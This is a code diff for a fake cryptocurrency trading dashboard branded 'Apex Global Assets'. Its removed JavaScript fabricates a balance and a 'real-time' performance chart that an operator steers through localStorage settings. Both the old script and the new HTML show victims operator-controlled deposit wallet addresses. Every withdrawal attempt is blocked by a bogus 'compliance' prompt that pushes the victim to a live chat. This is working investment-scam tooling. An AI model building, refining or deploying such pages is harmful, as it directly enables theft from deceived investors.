@@ -1,176 +1,142 @@
-document.addEventListener('DOMContentLoaded', () => {
-    console.log("Core Trading Module v3.0 Online.");
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Apex Global Assets | Dashboard</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+</head>
+<body class="bg-[#0b0f19] text-slate-100 min-h-screen font-sans antialiased">
 
-    // 1. Structural Configuration Baseline State Settings
-    let targetBaseBalance = 600.00;
-    try {
-        const cachedBalance = localStorage.getItem('admin_balance');
-        if (cachedBalance) targetBaseBalance = parseFloat(cachedBalance);
-    } catch (e) {
-        console.error("Storage state access failure:", e);
-    }
+    <header class="border-b border-slate-800 bg-[#111827]/50 backdrop-blur-md sticky top-0 z-40">
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 h-16 flex items-center justify-between">
+            <div class="flex items-center gap-3">
+                <div class="w-8 h-8 rounded-lg bg-emerald-500 flex items-center justify-center font-bold text-slate-950">Ac</div>
+                <span class="font-bold text-lg tracking-wider text-transparent bg-clip-text bg-gradient-to-r from-emerald-400 to-teal-400">EXGLOBAL</span>
+            </div>
+            <div class="flex items-center gap-2">
+                <span class="w-2 h-2 rounded-full bg-emerald-500 animate-pulse"></span>
+                <span class="text-xs text-slate-400 font-medium">Account Verified</span>
+            </div>
+        </div>
+    </header>
 
-    let activeLiveValue = targetBaseBalance;
-    let baselineReferenceTick = activeLiveValue;
-
-    // Build balanced historical trend coordinates
-    let technicalDataStream = Array(10).fill(targetBaseBalance).map((val, step) => {
-        return val + (step - 5) * (Math.random() * 1.15);
-    });
-
-    // Main Asset Render Logic Interface Links
-    function pushLiveTickerMetrics(isTrendBullish) {
-        const balanceDisplayNode = document.getElementById('balance-display');
-        if (balanceDisplayNode) {
-            balanceDisplayNode.innerText = '$' + activeLiveValue.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
-            balanceDisplayNode.style.color = isTrendBullish ? '#10b981' : '#ef4444';
-        }
-    }
-    pushLiveTickerMetrics(true);
-
-    // 2. High-Fidelity Performance Chart Initialization
-    let realTimeChartReference = null;
-    const canvasRenderTarget = document.getElementById('LivePerformanceChart');
-
-    function executeChartUpdate(isTrendBullish) {
-        if (!canvasRenderTarget || typeof Chart === 'undefined') return;
-
-        if (realTimeChartReference) {
-            realTimeChartReference.destroy();
-        }
-
-        const renderContext = canvasRenderTarget.getContext('2d');
-        const volumetricGradient = renderContext.createLinearGradient(0, 0, 0, canvasRenderTarget.clientHeight || 220);
+    <main class="max-w-4xl mx-auto px-4 py-10 space-y-8">
         
-        let aestheticStrokeColor = '#10b981'; // Green UI State Accent
-        if (!isTrendBullish) {
-            aestheticStrokeColor = '#ef4444'; // Red UI State Accent
-            volumetricGradient.addColorStop(0, 'rgba(239, 68, 68, 0.12)');
-            volumetricGradient.addColorStop(1, 'rgba(239, 68, 68, 0.00)');
-        } else {
-            volumetricGradient.addColorStop(0, 'rgba(16, 185, 129, 0.12)');
-            volumetricGradient.addColorStop(1, 'rgba(16, 185, 129, 0.00)');
-        }
-
-        const historicalTimeLabels = technicalDataStream.map((_, index) => `T-${10 - index}`);
-
-        realTimeChartReference = new Chart(renderContext, {
-            type: 'line',
-            data: {
-                labels: historicalTimeLabels,
-                datasets: [{
-                    data: [...technicalDataStream],
-                    borderColor: aestheticStrokeColor,
-                    borderWidth: 2.2,
-                    pointRadius: 0,
-                    tension: 0.32,
-                    fill: true,
-                    backgroundColor: volumetricGradient
-                }]
-            },
-            options: {
-                responsive: true,
-                maintainAspectRatio: false,
-                animation: { duration: 750 }, // Highly dampened smooth transition curve
-                plugins: { legend: { display: false } },
-                scales: {
-                    x: { display: false },
-                    y: {
-                        grid: { color: 'rgba(51, 65, 85, 0.06)', drawBorder: false },
-                        ticks: {
-                            color: '#64748b',
-                            font: { size: 10 },
-                            callback: function(numericValue) { return '$' + numericValue.toFixed(2); }
-                        }
-                    }
-                }
-            }
-        });
-    }
-
-    executeChartUpdate(true);
-
-    // 3. Low-Volatility Simulation Calculation Engine (Executes every 6.0 Seconds)
-    setInterval(() => {
-        const structuralTrendDirective = localStorage.getItem('chart_trend_directive') || 'stable';
-        
-        baselineReferenceTick = activeLiveValue;
-        
-        // Highly dampened value swing metrics to stop sharp drops or spikes
-        let incrementalDeltaValue = (Math.random() - 0.5) * 0.45;
-
-        if (structuralTrendDirective === 'upward') {
-            incrementalDeltaValue += 0.18; // Gradual climb
-        } else if (structuralTrendDirective === 'downward') {
-            incrementalDeltaValue -= 0.22; // Gradual descent
-        }
-
-        activeLiveValue += incrementalDeltaValue;
-        if (activeLiveValue < 0) activeLiveValue = 0;
-
-        const evaluatedDirectionState = activeLiveValue >= baselineReferenceTick;
-
-        technicalDataStream.push(activeLiveValue);
-        technicalDataStream.shift();
-
-        pushLiveTickerMetrics(evaluatedDirectionState);
-        executeChartUpdate(evaluatedDirectionState);
-    }, 6000);
-
-    // 4. Integrated Dynamic Transaction Overlay Router
-    const globalActionButtons = document.querySelectorAll('button');
-    let quickDepositTriggerNode = null;
-    let withdrawFundsTriggerNode = null;
-
-    globalActionButtons.forEach(buttonElement => {
-        const textContent = buttonElement.innerText || "";
-        if (textContent.includes('Deposit')) {
-            quickDepositTriggerNode = buttonElement;
-        } else if (textContent.includes('Withdraw')) {
-            withdrawFundsTriggerNode = buttonElement;
-        }
-    });
-
-    // Secure Inbound Address Modal Presentation Link
-    if (quickDepositTriggerNode) {
-        quickDepositTriggerNode.addEventListener('click', () => {
-            const multiCurrencyModal = document.getElementById('deposit-modal') || document.querySelector('.modal-deposit');
-            if (multiCurrencyModal) {
-                multiCurrencyModal.style.display = 'flex';
-            } else {
-                // Fallback rendering structure for address routing interfaces
-                const activeNetworkAsset = localStorage.getItem('forced_network') || 'USDT (TRC20)';
-                const functionalWalletAddress = localStorage.getItem('admin_address') || '0x71C2496E7278274d3b4614a420971a9E3a9411bb';
-                alert(`Asset Inbound Routing Gateway:\n━━━━━━━━━━━━━━━━━━━━\nAsset Token: ${activeNetworkAsset}\nTarget Address Node: ${functionalWalletAddress}\n\nStatus: Awaiting network verification transaction confirmation...`);
-            }
-        });
-    }
-
-    // Secure Verification Processing Interceptor Link
-    if (withdrawFundsTriggerNode) {
-        withdrawFundsTriggerNode.addEventListener('click', () => {
-            const validationModalWindow = document.getElementById('withdraw-modal') || document.querySelector('.modal-withdraw');
-            if (validationModalWindow) {
-                validationModalWindow.style.display = 'flex';
-            } else {
-                // Fallback verification communication layout prompt
-                alert("Security Message Gateway:\n━━━━━━━━━━━━━━━━━━━━\nYour pending request requires manual validation processing.\n\nPlease contact security verification support live chat immediately to clear compliance requirements and execute the payout request.");
-            }
-        });
-    }
-
-    // 5. Shared Global Storage Pipeline Synchronizer Link
-    window.addEventListener('storage', (storageContextEvent) => {
-        if (!storageContextEvent.newValue) return;
-
-        if (storageContextEvent.key === 'admin_balance') {
-            targetBaseBalance = parseFloat(storageContextEvent.newValue) || 600.00;
-            activeLiveValue = targetBaseBalance;
-            baselineReferenceTick = activeLiveValue;
-            technicalDataStream = Array(10).fill(targetBaseBalance);
+        <div class="bg-[#111827] border border-slate-800/80 rounded-2xl p-6 sm:p-8 flex flex-col sm:flex-row justify-between items-start sm:items-center gap-6 shadow-xl">
+            <div class="space-y-1">
+                <p class="text-xs font-semibold uppercase tracking-wider text-slate-400">Total Account Balance (USDT)</p>
+                <h1 id="balance-display" class="text-3xl sm:text-4xl font-extrabold tracking-tight text-white transition-all duration-300 font-mono">
+                    $600.00
+                </h1>
+                <p id="trend-indicator" class="text-xs font-medium text-emerald-400">+0.00% Today</p>
+            </div>
             
-            pushLiveTickerMetrics(true);
-            executeChartUpdate(true);
+            <div class="flex items-center gap-3 w-full sm:w-auto">
+                <button id="quickDepositBtn" class="flex-1 sm:flex-initial px-6 py-3 bg-emerald-500 hover:bg-emerald-400 text-slate-950 font-bold rounded-xl transition-all duration-150 shadow-lg shadow-emerald-500/10 cursor-pointer text-sm">
+                    Quick Deposit
+                </button>
+                <button id="withdrawFundsBtn" class="flex-1 sm:flex-initial px-6 py-3 bg-[#1f2937] hover:bg-[#2d3748] border border-slate-700 text-slate-200 font-semibold rounded-xl transition-all duration-150 cursor-pointer text-sm">
+                    Withdraw Funds
+                </button>
+            </div>
+        </div>
+
+        <div class="bg-[#111827] border border-slate-800/80 rounded-2xl p-6 shadow-xl space-y-4">
+            <div class="flex items-center justify-between">
+                <h3 class="text-sm font-bold tracking-wide uppercase text-slate-300">Live Return Performance (24H)</h3>
+                <span class="px-2.5 py-1 bg-[#1f2937] border border-slate-700 rounded-md text-[10px] font-medium tracking-wider text-slate-400 uppercase">Real-Time Data Feed</span>
+            </div>
+            <div class="h-64 sm:h-72 w-full relative">
+                <canvas id="LivePerformanceChart"></canvas>
+            </div>
+        </div>
+    </main>
+
+    <div id="deposit-modal" class="fixed inset-0 bg-black/75 backdrop-blur-sm z-50 hidden items-center justify-center p-4">
+        <div class="bg-[#111827] border border-slate-800 rounded-2xl w-full max-w-md p-6 shadow-2xl space-y-5 transform transition-all">
+            <div class="flex items-center justify-between">
+                <h3 class="text-lg font-bold text-white flex items-center gap-2">
+                    <span class="text-emerald-400">📥</span> Secure Fund Deposit
+                </h3>
+                <button onclick="closeModal('deposit-modal')" class="text-slate-400 hover:text-white font-bold cursor-pointer text-xl p-1">&times;</button>
+            </div>
+            
+            <div class="space-y-4">
+                <div>
+                    <label class="block text-xs font-semibold uppercase text-slate-400 mb-2">Select Currency Asset</label>
+                    <select id="depositAssetSelect" class="w-full bg-[#1f2937] border border-slate-700 rounded-xl px-4 py-3 text-slate-200 focus:outline-none focus:border-emerald-500 font-medium" onchange="updateDepositWalletAddress()">
+                        <option value="USDT">USDT (TRC20 Network)</option>
+                        <option value="BTC">Bitcoin (BTC Mainnet)</option>
+                        <option value="ETH">Ethereum (ETH ERC20)</option>
+                    </select>
+                </div>
+
+                <div>
+                    <label class="block text-xs font-semibold uppercase text-slate-400 mb-2">Target Destination Inbound Wallet Address</label>
+                    <div class="flex items-center gap-2 bg-[#1f2937] border border-slate-700 rounded-xl px-4 py-3 font-mono text-xs text-white overflow-hidden select-all">
+                        <span id="displayWalletAddress" class="truncate w-full">0x71C2496E7278274d3b4614a420971a9E3a9411bb</span>
+                        <span class="text-slate-500 cursor-pointer hover:text-emerald-400" title="Copy Node Asset Address" onclick="alert('Wallet copied to clipboard!')">📋</span>
+                    </div>
+                </div>
+
+                <div class="bg-blue-950/40 border border-blue-900/50 rounded-xl p-4 text-xs text-blue-300 space-y-1">
+                    <p class="font-semibold text-blue-400">⚠️ Network Routing Verification Notice:</p>
+                    <p>Send only the corresponding currency option selected above directly to this specific destination layout node. Transactions will credit automatically post network node confirmations.</p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div id="withdraw-modal" class="fixed inset-0 bg-black/75 backdrop-blur-sm z-50 hidden items-center justify-center p-4">
+        <div class="bg-[#111827] border border-slate-800 rounded-2xl w-full max-w-md p-6 shadow-2xl space-y-5 transform transition-all">
+            <div class="flex items-center justify-between">
+                <h3 class="text-lg font-bold text-white flex items-center gap-2">
+                    <span class="text-rose-400">🛡️</span> Security Compliance Gateway
+                </h3>
+                <button onclick="closeModal('withdraw-modal')" class="text-slate-400 hover:text-white font-bold cursor-pointer text-xl p-1">&times;</button>
+            </div>
+            
+            <div class="text-center p-4 space-y-4">
+                <div class="w-16 h-16 rounded-full bg-rose-500/10 border border-rose-500/20 text-rose-500 flex items-center justify-center text-3xl mx-auto animate-pulse">
+                    ⚠️
+                </div>
+                <div class="space-y-2">
+                    <h4 class="text-md font-bold text-slate-200">Account Verification Compliance Required</h4>
+                    <p class="text-xs text-slate-400 leading-relaxed mx-auto max-w-sm">
+                        Your transaction payout request cannot be automated right now. To clear verification standards and release asset values, click below to pass validation chat requirements.
+                    </p>
+                </div>
+            </div>
+
+            <button onclick="triggerVerificationChat()" class="w-full py-3 bg-emerald-500 hover:bg-emerald-400 text-slate-950 font-bold rounded-xl transition-all duration-150 shadow-lg text-sm tracking-wide cursor-pointer uppercase">
+                Verify Withdrawal Account Now
+            </button>
+        </div>
+    </div>
+
+    <script src="app.js"></script>
+    <script>
+        // Simple universal overlay triggers
+        function closeModal(modalId) {
+            document.getElementById(modalId).style.display = 'none';
         }
-    });
-});
+        function triggerVerificationChat() {
+            alert("Security Verification Channel:\n━━━━━━━━━━━━━━━━━━━━\nConnecting safely to live-chat compliance desk controllers. Please stand by...");
+        }
+        function updateDepositWalletAddress() {
+            const chosenCoin = document.getElementById('depositAssetSelect').value;
+            const addressSpan = document.getElementById('displayWalletAddress');
+            
+            if (chosenCoin === 'USDT') {
+                addressSpan.innerText = localStorage.getItem('admin_address') || "0x71C2496E7278274d3b4614a420971a9E3a9411bb";
+            } else if (chosenCoin === 'BTC') {
+                addressSpan.innerText = localStorage.getItem('btc_address') || "1BitcoinAddressHere";
+            } else if (chosenCoin === 'ETH') {
+                addressSpan.innerText = localStorage.getItem('eth_address') || "0xEthAddressHere";
+            }
+        }
+    </script>
+</body>
+</html>
